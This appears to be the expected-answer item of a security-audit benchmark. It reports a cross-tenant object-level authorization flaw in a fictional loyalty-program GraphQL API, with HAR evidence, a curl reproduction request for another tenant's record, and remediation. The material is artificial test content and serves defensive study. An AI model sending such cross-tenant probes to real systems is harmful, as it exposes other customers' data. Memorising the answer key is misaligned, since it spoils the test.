# Expected Response

## System
- **Domain:** Retail / Loyalty Program
- **System:** RewardCore Loyalty API
- **Example ID:** GQL-0223

## Priority Findings

### Finding 1: Retail Loyalty — BOLA via Bulk/List Endpoint getResource Exposes Cross-Tenant Loyalty Data (Pattern 1.3)
**Severity:** High
**Category:** BOLA / Bulk or List Endpoints

**Summary:**
Per §4.0 (RISK-GQL-223): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 1.3 — bulk or list endpoints): the bulk/list endpoint returns loyalty program records across tenant boundaries when a cross-tenant `resourceId` is supplied. An attacker from `tenant-46c2` queried `getResource(id: "R-2223")` and received loyalty program data belonging to `tenant-3fa0`, including `CONFIDENTIAL-46c23fa0`. In Retail / Loyalty Programs, unauthorized access to member profiles, points balances, and redemption histories enables loyalty fraud and PII exposure.

**Evidence from HAR:**
- Request: `POST https://api.rewardcore-loyalty-a.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-46c2`
- Query: `getResource(id: "R-2223") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`: `tenantId: "tenant-3fa0"`, `ownerId: "other-user-46c23fa0"`, `sensitiveField: "CONFIDENTIAL-46c23fa0"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-46c23fa0`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-223 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 1.3 | Bulk/list endpoint returns cross-tenant loyalty records |
| HAR query | id: "R-2223" | Cross-tenant loyalty record ID |
| HAR response | tenantId | tenant-3fa0 returned to tenant-46c2 |
| HAR response | sensitiveField | CONFIDENTIAL-46c23fa0 |
| HAR header | x-request-id | req-46c23fa0 |

## Steps to Reproduce

### Step 1 — getResource bulk/list BOLA cross-tenant retail (HAR)
```bash
curl -s -X POST https://api.rewardcore-loyalty-a.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-46c2" \
  -d '{"query": "query { getResource(id: \"R-2223\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `tenant-3fa0` loyalty data including `CONFIDENTIAL-46c23fa0`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
2. Bulk/list endpoints must filter results to `tenant_id = $jwt.tenantId` server-side.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
